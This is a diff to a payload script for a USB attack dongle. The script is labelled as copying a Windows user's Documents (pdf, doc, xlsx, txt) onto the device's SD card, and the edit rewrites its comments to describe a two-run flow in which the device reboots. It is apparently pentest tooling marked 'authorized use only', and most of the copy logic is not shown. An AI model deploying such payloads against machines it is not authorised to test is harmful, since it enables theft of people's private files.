@@ -1,7 +1,8 @@
 REM ============================================================
 REM Windows: exfil Documents (pdf/doc/xlsx/txt) to the dongle
-REM REQUIRES: USB_STORAGE enabled (Settings -> USB Storage, or
-REM   the script issues USB_STORAGE enable below).
+REM TWO-RUN FLOW: run 1 enables USB storage and the DEVICE REBOOTS
+REM (normal - the USB descriptor only changes at boot). Run the script
+REM a SECOND time: the enable is a no-op and the copy runs.
 REM The SD card appears as a removable drive (volume "DISK");
 REM files are copied into \exfil on the card, encrypted at rest.
 REM AUTHORIZED USE ONLY.
@@ -16,4 +17,5 @@ LED_BLINK 5 #FFD600
 SCREEN_TEXT exfil done #FFD600
 LOG win_exfil_documents: robocopy issued
 REM Optional cleanup - disable storage again (host re-enumerates):
+REM Optional cleanup - run when done (device reboots):
 REM USB_STORAGE disable
